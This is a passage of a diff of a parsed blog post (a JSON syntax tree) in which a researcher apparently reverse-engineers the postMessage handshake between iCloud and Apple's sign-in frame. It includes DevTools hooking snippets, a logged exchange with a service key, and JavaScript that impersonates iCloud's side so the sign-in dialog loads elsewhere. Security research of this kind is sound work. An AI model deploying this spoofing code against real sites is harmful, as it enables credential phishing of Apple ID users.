>                 },
>                 "end": {
>                   "line": 716,
>                   "column": 439,
>                   "offset": 33817
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Snooping on the successful ",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 1,
>                       "offset": 33821
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 28,
>                       "offset": 33848
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 28,
>                       "offset": 33848
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 41,
>                       "offset": 33861
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " traffic that the real ",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 41,
>                       "offset": 33861
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 64,
>                       "offset": 33884
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 64,
>                       "offset": 33884
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 76,
>                       "offset": 33896
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " makes is not easy, especially in this case. If you use Google Chrome Devtools, like I do to write these vulnerabilities, you won't find ",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 76,
>                       "offset": 33896
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 213,
>                       "offset": 34033
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 213,
>                       "offset": 34033
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 226,
>                       "offset": 34046
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " on the 'network' panel with the other HTTP requests. Additionally to this, if you set up some code to watch ",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 226,
>                       "offset": 34046
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 335,
>                       "offset": 34155
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 335,
>                       "offset": 34155
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 348,
>                       "offset": 34168
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " traffic across the browser you neeed to get it in ",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 348,
>                       "offset": 34168
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 399,
>                       "offset": 34219
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "fast",
>                       "position": {
>                         "start": {
>                           "line": 718,
>                           "column": 400,
>                           "offset": 34220
>                         },
>                         "end": {
>                           "line": 718,
>                           "column": 404,
>                           "offset": 34224
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 399,
>                       "offset": 34219
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 405,
>                       "offset": 34225
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". This whole exchange happens in the first second or so of the page loading in.",
>                   "position": {
>                     "start": {
>                       "line": 718,
>                       "column": 405,
>                       "offset": 34225
>                     },
>                     "end": {
>                       "line": 718,
>                       "column": 484,
>                       "offset": 34304
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 718,
>                   "column": 1,
>                   "offset": 33821
>                 },
>                 "end": {
>                   "line": 718,
>                   "column": 484,
>                   "offset": 34304
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I can set a break point on ",
>                   "position": {
>                     "start": {
>                       "line": 720,
>                       "column": 1,
>                       "offset": 34308
>                     },
>                     "end": {
>                       "line": 720,
>                       "column": 28,
>                       "offset": 34335
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "load",
>                   "position": {
>                     "start": {
>                       "line": 720,
>                       "column": 28,
>                       "offset": 34335
>                     },
>                     "end": {
>                       "line": 720,
>                       "column": 34,
>                       "offset": 34341
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " to make the JavaScript stop just as the page loads in, and then run in the console:",
>                   "position": {
>                     "start": {
>                       "line": 720,
>                       "column": 34,
>                       "offset": 34341
>                     },
>                     "end": {
>                       "line": 720,
>                       "column": 118,
>                       "offset": 34425
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 720,
>                   "column": 1,
>                   "offset": 34308
>                 },
>                 "end": {
>                   "line": 720,
>                   "column": 118,
>                   "offset": 34425
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "window.addEventListener(\n    'message',\n    message => console.log(message)\n)",
>               "position": {
>                 "start": {
>                   "line": 722,
>                   "column": 1,
>                   "offset": 34429
>                 },
>                 "end": {
>                   "line": 727,
>                   "column": 4,
>                   "offset": 34529
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If I do this, then whenever the iCloud page gets a message from the ",
>                   "position": {
>                     "start": {
>                       "line": 729,
>                       "column": 1,
>                       "offset": 34533
>                     },
>                     "end": {
>                       "line": 729,
>                       "column": 69,
>                       "offset": 34601
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 729,
>                       "column": 69,
>                       "offset": 34601
>                     },
>                     "end": {
>                       "line": 729,
>                       "column": 86,
>                       "offset": 34618
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " frame, it'll print it to the console. With that, we end up with this:",
>                   "position": {
>                     "start": {
>                       "line": 729,
>                       "column": 86,
>                       "offset": 34618
>                     },
>                     "end": {
>                       "line": 729,
>                       "column": 156,
>                       "offset": 34688
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 729,
>                   "column": 1,
>                   "offset": 34533
>                 },
>                 "end": {
>                   "line": 729,
>                   "column": 156,
>                   "offset": 34688
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": null,
>               "meta": null,
>               "value": "pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"receivePingRequest\",\"params\":[\"ready\"],\"id\":\"9BA799AA-6777-4DCC-A615-A8758C9E9CE2\"}\n\npmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"ready\",\"params\":[{\"iframeTitle\":\" Sign In with Your Apple ID\"}],\"id\":\"E0236187-9F33-42BC-AD1C-4F3866803C55\"}\n\npmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"receivePingRequest\",\"params\":[\"config\"],\"id\":\"87A8E469-8A6B-4124-8BB0-1A1AB40416CD\"}\n\npmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"config\",\"params\":[],\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\"}",
>               "position": {
>                 "start": {
>                   "line": 731,
>                   "column": 1,
>                   "offset": 34692
>                 },
>                 "end": {
>                   "line": 739,
>                   "column": 4,
>                   "offset": 35185
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The first thing I thought when I saw this was 'geez. that's complicated as hell'. This doesn't tell us a whole lot either, since our event listener only tells us what ",
>                   "position": {
>                     "start": {
>                       "line": 741,
>                       "column": 1,
>                       "offset": 35189
>                     },
>                     "end": {
>                       "line": 741,
>                       "column": 168,
>                       "offset": 35356
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 741,
>                       "column": 168,
>                       "offset": 35356
>                     },
>                     "end": {
>                       "line": 741,
>                       "column": 185,
>                       "offset": 35373
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is sending us because the listener is only set on the outer ",
>                   "position": {
>                     "start": {
>                       "line": 741,
>                       "column": 185,
>                       "offset": 35373
>                     },
>                     "end": {
>                       "line": 741,
>                       "column": 246,
>                       "offset": 35434
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 741,
>                       "column": 246,
>                       "offset": 35434
>                     },
>                     "end": {
>                       "line": 741,
>                       "column": 258,
>                       "offset": 35446
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " window. But, we are seeing the ",
>                   "position": {
>                     "start": {
>                       "line": 741,
>                       "column": 258,
>                       "offset": 35446
>                     },
>                     "end": {
>                       "line": 741,
>                       "column": 290,
>                       "offset": 35478
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "\"ready\"",
>                   "position": {
>                     "start": {
>                       "line": 741,
>                       "column": 290,
>                       "offset": 35478
>                     },
>                     "end": {
>                       "line": 741,
>                       "column": 299,
>                       "offset": 35487
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " message we saw in the code. We just need to know how to reply to it.",
>                   "position": {
>                     "start": {
>                       "line": 741,
>                       "column": 299,
>                       "offset": 35487
>                     },
>                     "end": {
>                       "line": 741,
>                       "column": 368,
>                       "offset": 35556
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 741,
>                   "column": 1,
>                   "offset": 35189
>                 },
>                 "end": {
>                   "line": 741,
>                   "column": 368,
>                   "offset": 35556
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This is a situation I've not come across before. Because the ",
>                   "position": {
>                     "start": {
>                       "line": 743,
>                       "column": 1,
>                       "offset": 35560
>                     },
>                     "end": {
>                       "line": 743,
>                       "column": 62,
>                       "offset": 35621
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 743,
>                       "column": 62,
>                       "offset": 35621
>                     },
>                     "end": {
>                       "line": 743,
>                       "column": 79,
>                       "offset": 35638
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " frame is being generated after page load, we need to bind an event to tell us what it's recieving just as it starts existing. My initial approach to this consisted of trying to use events to try to work out when the ",
>                   "position": {
>                     "start": {
>                       "line": 743,
>                       "column": 79,
>                       "offset": 35638
>                     },
>                     "end": {
>                       "line": 743,
>                       "column": 296,
>                       "offset": 35855
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "<iframe>",
>                   "position": {
>                     "start": {
>                       "line": 743,
>                       "column": 296,
>                       "offset": 35855
>                     },
>                     "end": {
>                       "line": 743,
>                       "column": 306,
>                       "offset": 35865
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is actually appended:",
>                   "position": {
>                     "start": {
>                       "line": 743,
>                       "column": 306,
>                       "offset": 35865
>                     },
>                     "end": {
>                       "line": 743,
>                       "column": 328,
>                       "offset": 35887
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 743,
>                   "column": 1,
>                   "offset": 35560
>                 },
>                 "end": {
>                   "line": 743,
>                   "column": 328,
>                   "offset": 35887
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "((() => {\nconsole.log(\"postMessage hook added\");\nnew MutationObserver((mutations, observer) => {\nconst flatten = (a,c) => a.concat(c);\nconst allNodes =  mutations.filter(({ type }) => type == \"childList\")\n    .map(({ addedNodes }) => Array.from(addedNodes)).reduce(flatten, []);\n  \nallNodes\n  .forEach(parentNode => {\n    if (!parentNode.getElementsByTagName) return;\n    [...parentNode.getElementsByTagName(\"iframe\")].forEach(iframe => {\n      let x = iframe.contentWindow.postMessage;\n      console.log(\"hooked\", iframe);\n      iframe.contentWindow.postMessage = function(...a) {\n        console.log(`SEND to`, iframe, `${a}`);\n        x.apply(iframe, [...a]);\n      }\n    })\n  })\n  \n  \n}).observe(document.documentElement, {childList: true, subtree: true });\n\nwindow.addEventListener(\"message\", e => console.log(`RCV from`, e.origin, {...e}))\n})(),false);",
>               "position": {
>                 "start": {
>                   "line": 745,
>                   "column": 1,
>                   "offset": 35891
>                 },
>                 "end": {
>                   "line": 771,
>                   "column": 4,
>                   "offset": 36793
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "As much time as it took to write this, it fails because the ",
>                   "position": {
>                     "start": {
>                       "line": 773,
>                       "column": 1,
>                       "offset": 36797
>                     },
>                     "end": {
>                       "line": 773,
>                       "column": 61,
>                       "offset": 36857
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 773,
>                       "column": 61,
>                       "offset": 36857
>                     },
>                     "end": {
>                       "line": 773,
>                       "column": 78,
>                       "offset": 36874
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " frame is on a different origin to our embedding frame, ",
>                   "position": {
>                     "start": {
>                       "line": 773,
>                       "column": 78,
>                       "offset": 36874
>                     },
>                     "end": {
>                       "line": 773,
>                       "column": 134,
>                       "offset": 36930
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 773,
>                       "column": 134,
>                       "offset": 36930
>                     },
>                     "end": {
>                       "line": 773,
>                       "column": 146,
>                       "offset": 36942
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". The browser, as mentioned before blocks pages that don't share the same domain from modifying each other.",
>                   "position": {
>                     "start": {
>                       "line": 773,
>                       "column": 146,
>                       "offset": 36942
>                     },
>                     "end": {
>                       "line": 773,
>                       "column": 253,
>                       "offset": 37049
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 773,
>                   "column": 1,
>                   "offset": 36797
>                 },
>                 "end": {
>                   "line": 773,
>                   "column": 253,
>                   "offset": 37049
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The technique that I've found to work best is to use Google Chrome Dev tools' 'Advanced Breakpoint' feature. What it lets you do is inject code at a specific point in some code's execution. If your injected code returns ",
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 1,
>                       "offset": 37053
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 221,
>                       "offset": 37273
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "true",
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 221,
>                       "offset": 37273
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 227,
>                       "offset": 37279
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", then the execution stops. But rather than using it to break code, we instead use it to ",
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 227,
>                       "offset": 37279
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 316,
>                       "offset": 37368
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "inject",
>                       "position": {
>                         "start": {
>                           "line": 775,
>                           "column": 317,
>                           "offset": 37369
>                         },
>                         "end": {
>                           "line": 775,
>                           "column": 323,
>                           "offset": 37375
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 316,
>                       "offset": 37368
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 324,
>                       "offset": 37376
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " code on the very first line. So looking at ",
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 324,
>                       "offset": 37376
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 368,
>                       "offset": 37420
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://appleid.cdn-apple.com/appleauth/static/jsj/N1575552449/app.js",
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 368,
>                       "offset": 37420
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 439,
>                       "offset": 37491
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " we set a custom breakpoint on the first line that runs ",
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 439,
>                       "offset": 37491
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 495,
>                       "offset": 37547
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.addEventListener('message', m => console.log(m))",
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 495,
>                       "offset": 37547
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 552,
>                       "offset": 37604
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 775,
>                       "column": 552,
>                       "offset": 37604
>                     },
>                     "end": {
>                       "line": 775,
>                       "column": 553,
>                       "offset": 37605
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 775,
>                   "column": 1,
>                   "offset": 37053
>                 },
>                 "end": {
>                   "line": 775,
>                   "column": 553,
>                   "offset": 37605
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This gives us the other half of the conversation, because ",
>                   "position": {
>                     "start": {
>                       "line": 777,
>                       "column": 1,
>                       "offset": 37609
>                     },
>                     "end": {
>                       "line": 777,
>                       "column": 59,
>                       "offset": 37667
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "app.js",
>                   "position": {
>                     "start": {
>                       "line": 777,
>                       "column": 59,
>                       "offset": 37667
>                     },
>                     "end": {
>                       "line": 777,
>                       "column": 67,
>                       "offset": 37675
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " runs ",
>                   "position": {
>                     "start": {
>                       "line": 777,
>                       "column": 67,
>                       "offset": 37675
>                     },
>                     "end": {
>                       "line": 777,
>                       "column": 73,
>                       "offset": 37681
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "as soon as the singin page loads",
>                       "position": {
>                         "start": {
>                           "line": 777,
>                           "column": 74,
>                           "offset": 37682
>                         },
>                         "end": {
>                           "line": 777,
>                           "column": 106,
>                           "offset": 37714
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 777,
>                       "column": 73,
>                       "offset": 37681
>                     },
>                     "end": {
>                       "line": 777,
>                       "column": 107,
>                       "offset": 37715
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 777,
>                       "column": 107,
>                       "offset": 37715
>                     },
>                     "end": {
>                       "line": 777,
>                       "column": 108,
>                       "offset": 37716
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 777,
>                   "column": 1,
>                   "offset": 37609
>                 },
>                 "end": {
>                   "line": 777,
>                   "column": 108,
>                   "offset": 37716
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Here's a full, successful annotated conversation between parent (iCloud) and child (Apple ID):",
>                   "position": {
>                     "start": {
>                       "line": 779,
>                       "column": 1,
>                       "offset": 37720
>                     },
>                     "end": {
>                       "line": 779,
>                       "column": 95,
>                       "offset": 37814
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 779,
>                   "column": 1,
>                   "offset": 37720
>                 },
>                 "end": {
>                   "line": 779,
>                   "column": 95,
>                   "offset": 37814
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "json",
>               "meta": null,
>               "value": "\nI'm ready, are you ready?\n\nchild: pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"receivePingRequest\",\"params\":[\"ready\"],\"id\":\"9BA799AA-6777-4DCC-A615-A8758C9E9CE2\"}\n\nyeah bro im ready . lets do this\n\nparent: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"9BA799AA-6777-4DCC-A615-A8758C9E9CE2\",\"result\":true}\n\nalright. i am calling myself \"Sign In With Your Apple ID\"\n\nchild: pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"ready\",\"params\":[{\"iframeTitle\":\" Sign In with Your Apple ID\"}],\"id\":\"E0236187-9F33-42BC-AD1C-4F3866803C55\"}\n\ncool bro. cool bro. very cool. keep it coming\n\nparent : pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"E0236187-9F33-42BC-AD1C-4F3866803C55\",\"result\":true}\n\nok bro, let me know how i should configure the login dialog. that cool bro\n\nchild: pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"receivePingRequest\",\"params\":[\"config\"],\"id\":\"87A8E469-8A6B-4124-8BB0-1A1AB40416CD\"}\n\nyeah bro. very cool. very cool.\n\nparent: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"87A8E469-8A6B-4124-8BB0-1A1AB40416CD\",\"result\":true}\n\nok dude hit me with that config stuff\n\nchild: pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"config\",\"params\":[],\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\"}\n\nno worries my dude. make sure theres a remember me box. and uh. don't need a link to create an account. that wouldn't make sense. do need a link for if they forget their password. call the dialog \"sign in with iCloud\". heres the logo. keep it fresh my man.\n\nparent: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\",\"result\":{\"data\":{\"features\":{\"rememberMe\":true,\"createLink\":false,\"iForgotLink\":true,\"pause2FA\":false},\"signInLabel\":\"Sign in to iCloud\",\"serviceKey\":\"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\",\"defaultAccountNameAutoFillDomain\":\"icloud.com\",\"trustTokens\":[\"HSARMTnl/S90E=SRVX\"],\"rememberMeLabel\":\"keep-me-signed-in\",\"theme\":\"dark\",\"waitAnimationOnAuthComplete\":false,\"logo\":{\"src\":\"data:image/png;base64,[ ... ]ErkJggg==\",\"width\":\"100px\"}}}}\n\nand I'm out\n\nparent sends: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\",\"result\":true}",
>               "position": {
>                 "start": {
>                   "line": 780,
>                   "column": 1,
>                   "offset": 37816
>                 },
>                 "end": {
>                   "line": 817,
>                   "column": 4,
>                   "offset": 39871
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Still with me? Cool bro. Very cool. This conversation is kinda complicated, but for most of it we can just send back the mesage ID they send us back and ",
>                   "position": {
>                     "start": {
>                       "line": 819,
>                       "column": 1,
>                       "offset": 39875
>                     },
>                     "end": {
>                       "line": 819,
>                       "column": 154,
>                       "offset": 40028
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "\"result\": true",
>                   "position": {
>                     "start": {
>                       "line": 819,
>                       "column": 154,
>                       "offset": 40028
>                     },
>                     "end": {
>                       "line": 819,
>                       "column": 170,
>                       "offset": 40044
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". Here's how I implemented this conversation:",
>                   "position": {
>                     "start": {
>                       "line": 819,
>                       "column": 170,
>                       "offset": 40044
>                     },
>                     "end": {
>                       "line": 819,
>                       "column": 215,
>                       "offset": 40089
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 819,
>                   "column": 1,
>                   "offset": 39875
>                 },
>                 "end": {
>                   "line": 819,
>                   "column": 215,
>                   "offset": 40089
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "\n      const prefix = \"pmrpc.\"\n\n      if (!data.startsWith(prefix)) throw new Error(`got weird messsage ${JSON.stringify(data)}`);\n\n      // trim off 'pmrpc.'\n      const json = data.slice(prefix.length);\n\n      // extract the request JSON\n      const rq = JSON.parse(json);\n\n      const { method, jsonrpc, params, id } = rq;\n\n      // if we get a config, just return our pre-prepared response\n      if (method == \"config\") return frame.postMessage(`${prefix}${JSON.stringify({\n        ...config_resp, jsonrpc, id\n      })}`, \"*\");\n\n\n      // for everything else just tell the child it went OK\n      frame.postMessage(`${prefix}${JSON.stringify({\n        jsonrpc, id, result: true\n      })}`, \"*\");",
>               "position": {
>                 "start": {
>                   "line": 821,
>                   "column": 1,
>                   "offset": 40093
>                 },
>                 "end": {
>                   "line": 845,
>                   "column": 4,
>                   "offset": 40833
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I know what you're thinking, postMessage fans. Doesn't ",
>                   "position": {
>                     "start": {
>                       "line": 847,
>                       "column": 1,
>                       "offset": 40837
>                     },
>                     "end": {
>                       "line": 847,
>                       "column": 56,
>                       "offset": 40892
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 847,
>                       "column": 56,
>                       "offset": 40892
>                     },
>                     "end": {
>                       "line": 847,
>                       "column": 69,
>                       "offset": 40905
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " secure all of its calls by specifying where the messages go to, making this completely useless? postMessage fans, you'd be correct.",
>                   "position": {
>                     "start": {
>                       "line": 847,
>                       "column": 69,
>                       "offset": 40905
>                     },
>                     "end": {
>                       "line": 847,
>                       "column": 201,
>                       "offset": 41037
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 847,
>                   "column": 1,
>                   "offset": 40837
>                 },
>                 "end": {
>                   "line": 847,
>                   "column": 201,
>                   "offset": 41037
>                 },
>                 "indent": []
>               }
>             }
>           ],
>           "data": {
>             "hName": "section"
6382,6388c12805,12844
<           "type": "text",
<           "value": ", it's actually ",
<           "position": {
<             "start": {
<               "line": 363,
<               "column": 45,
<               "offset": 17678
---
>           "type": "section",
>           "depth": 2,
>           "children": [
>             {
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "PostMessage Fans, You'd Be Correct.",
>                   "position": {
>                     "start": {
>                       "line": 849,
>                       "column": 1,
>                       "offset": 41041
>                     },
>                     "end": {
>                       "line": 849,
>                       "column": 36,
>                       "offset": 41076
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 849,
>                   "column": 1,
>                   "offset": 41041
>                 },
>                 "end": {
>                   "line": 850,
>                   "column": 36,
>                   "offset": 41113
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
6390,6393c12846,13154
<             "end": {
<               "line": 363,
<               "column": 61,
<               "offset": 17694
---
